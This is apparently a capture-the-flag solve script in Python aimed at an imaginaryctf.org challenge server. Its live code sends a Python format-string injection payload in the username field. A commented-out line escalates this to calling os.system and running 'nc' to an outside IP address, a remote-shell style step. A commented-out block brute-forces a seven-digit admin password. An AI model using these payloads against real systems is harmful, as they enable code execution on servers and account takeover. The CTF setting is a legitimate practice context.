#!/usr/bin/env python3

# from time import sleep
import requests
# from itertools import product
# import os

URL = "http://puzzler7.imaginaryctf.org:11005/"

# username = "{passhash.__class__.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('nc 52.220.121.212 10963')}"
username = "{passhash.__dir__}"
r = requests.get(f"{URL}?username={username}&password=1")
print(r.text)

# NUM = "0123456789"
#
# session_file = "./saved_session"
#
# start = 0
# if os.path.isfile(session_file):
#     start = int(open(session_file).read().strip())
#
# candidates = list(product(NUM, repeat=7))[start:]
#
# try:
#     for p in candidates:
#         print(f"Trying {''.join(p)}")
#         r = requests.get(f"{URL}?username=admin&password={''.join(p)}")
#         if "Sorry" not in r.text:
#             print(r.text)
#             if "2 per 1 second" in r.text:
#                 raise KeyboardInterrupt
#             break
#         sleep(.5)
# except KeyboardInterrupt:
#     print("Saving the progress")
#     with open(session_file, 'w') as f:
#         f.write(''.join(p))
